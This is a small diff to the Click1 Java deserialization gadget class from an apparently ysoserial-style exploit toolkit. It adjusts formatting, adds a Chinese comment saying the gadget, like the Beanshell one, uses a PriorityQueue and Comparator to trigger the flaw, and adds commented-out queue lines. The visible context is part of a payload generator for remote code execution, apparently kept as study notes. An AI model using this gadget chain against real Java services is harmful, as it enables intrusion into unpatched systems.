@@ -44,10 +44,11 @@ import java.util.PriorityQueue;
 
     by @artsploit
 */
-@SuppressWarnings({ "rawtypes", "unchecked" })
+@SuppressWarnings({"rawtypes", "unchecked"})
 @Dependencies({"org.apache.click:click-nodeps:2.3.0", "javax.servlet:javax.servlet-api:3.1.0"})
-@Authors({ Authors.ARTSPLOIT })
+@Authors({Authors.ARTSPLOIT})
 public class Click1 implements ObjectPayload<Object> {
+    /*和Beanshell类似，都是用PriorityQueue做一个队列，然后进行用一个Comparator对象进行比较，在比较的时候触发漏洞bug*/
 
     public Object getObject(final String command) throws Exception {
 
@@ -61,6 +62,8 @@ public class Click1 implements ObjectPayload<Object> {
         // stub data for replacement later
         queue.add(new BigInteger("1"));
         queue.add(new BigInteger("1"));
+//        queue.add(1);
+//        queue.add(1);
 
         // switch method called by the comparator,
         // so it will trigger getOutputProperties() when objects in the queue are compared
